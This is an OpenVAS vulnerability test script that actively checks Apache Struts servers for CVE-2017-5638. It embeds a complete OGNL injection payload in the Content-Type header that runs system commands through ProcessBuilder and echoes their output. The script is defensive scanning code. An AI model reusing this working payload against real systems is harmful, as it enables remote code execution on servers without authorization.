###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_CVE_2017_5638.nasl 9436 2018-04-11 09:39:34Z cfischer $
#
# Apache Struts Remote Code Execution Vulnerability (Active Check)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.140180");
 script_cve_id("CVE-2017-5638");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Apache Struts Remote Code Execution Vulnerability (Active Check)");

 script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-045");

 script_tag(name: "impact" , value:"Successfully exploiting this issue may allow an attacker to execute arbitrary code in the context of the affected application.");
 script_tag(name: "vuldetect" , value:"Try to execute a command by sending a special crafted HTTP POST request.");
 script_tag(name: "solution" , value:"Updates are available. Please see the references or vendor advisory for more information.");
 script_tag(name: "summary" , value:"Apache Struts is prone to a remote code-execution vulnerability.");
 script_tag(name: "affected" , value:"Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10");
 script_tag(name:"solution_type", value: "VendorFix");

 script_tag(name:"qod_type", value:"exploit");
 script_version("$Revision: 9436 $");

 script_tag(name:"last_modification", value:"$Date: 2018-04-11 11:39:34 +0200 (Wed, 11 Apr 2018) $");
 script_tag(name:"creation_date", value:"2017-03-08 12:19:09 +0100 (Wed, 08 Mar 2017)");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
 script_dependencies("webmirror.nasl", "os_detection.nasl","gb_vmware_vcenter_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("www/action_jsp_do");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

port = get_http_port( default:80 );

urls = make_list( );

actions = get_kb_list( "www/" + port + "/content/extensions/action" );
if( actions && is_array( actions ) )
  urls = make_list( urls, actions );

dos = get_kb_list( "www/" + port + "/content/extensions/do" );
if( dos && is_array( dos ) )
  urls = make_list( urls, dos );

jsps = get_kb_list( "www/" + port + "/content/extensions/jsp" );
if( jsps && is_array( jsps ) )
  urls = make_list( urls, jsps );

if( get_kb_item( "VMware_vCenter/installed" ) )
  urls = make_list( "/statsreport/", urls );

cmds = exploit_commands();

x = 0;

foreach url ( urls )
{
  bound = 'OpenVAS_' + rand();

  data = '--' + bound + '\r\n' + 
         'Content-Disposition: form-data; name="OpenVAS"; filename="OpenVAS.txt"\r\n' + 
         'Content-Type: text/plain\r\n' + 
         '\r\n' + 
         'OpenVAS\r\n' + 
         '\r\n' + 
         '--' + bound + '--';

  foreach cmd ( keys( cmds ) )
  {
    c  = "{'" + cmds[ cmd ] + "'}";

    ex = "%{(#OpenVAS='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" + 
         "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." + 
         "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." + 
         "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c  + "))." + 
         "(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." + 
         "getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

    req = http_post_req( port:port, url:url, data:data, add_headers:make_array( "Content-Type:", ex ) );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( egrep( pattern:cmd, string:buf ) )
    {
      report = 'It was possible to execute the command `' + cmds[ cmd ] + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
      security_message( port:port, data:report );
      exit( 0 );
    }
  }

  if( x > 25 ) break;

}

exit( 0 );

